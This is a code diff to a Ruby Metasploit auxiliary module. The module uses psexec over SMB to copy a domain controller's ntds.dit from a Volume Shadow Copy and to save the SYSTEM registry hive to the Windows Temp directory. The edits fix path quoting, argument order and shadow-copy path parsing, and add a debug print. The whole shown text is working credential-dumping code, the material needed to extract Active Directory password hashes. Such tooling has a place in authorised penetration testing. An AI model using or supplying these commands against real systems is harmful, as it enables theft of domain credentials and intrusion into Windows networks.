@@ -150,7 +150,8 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("Copying ntds.dit to Windows Temp directory")
 		begin 
 			# Try to copy ntds.dit from VSC
-			ntdspath = vscpath.to_s + '\\WINDOWS\\NTDS\\ntds.dit'
+			ntdspath = vscpath.to_s + "\\WINDOWS\\NTDS\\ntds.dit"
+			puts ntdspath
 			command = "#{cmd} /C copy /Y #{ntdspath} C:\\WINDOWS\\Temp\\ntds"
 			simple.connect(smbshare)
 			psexec(smbshare, command)
@@ -170,7 +171,7 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("Copying SYSTEM hive file to Windows Temp directory")
 		begin
 			# Try to crate the sys hive copy
-			command = "#{cmd} /C reg.exe save /y HKLM\\SYSTEM C:\\WINDOWS\\Temp\\sys"
+			command = "#{cmd} /C reg.exe save HKLM\\SYSTEM C:\\WINDOWS\\Temp\\sys /y"
 			simple.connect(smbshare)
 			psexec(smbshare, command)
 		rescue StandardError => hiveerror
@@ -255,6 +256,7 @@ class Metasploit3 < Msf::Auxiliary
 	# Gets the path to the Volume Shadow Copy
 	#-----------------------------------------------------
 	def get_vscpath(ip, file)
+		prepath = '\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy'
 		vsc = ""
 		simple.connect("\\\\#{ip}\\#{datastore['SMBSHARE']}")
 		outfile = simple.open(file, 'ro')
@@ -264,7 +266,7 @@ class Metasploit3 < Msf::Auxiliary
 		end 
 		outfile.close
 		simple.disconnect("\\\\#{ip}\\#{datastore['SMBSHARE']}")
-		return vsc.split(" ")[4]
+		return prepath + vsc.split("ShadowCopy")[1].chomp
 	end
 	
 	
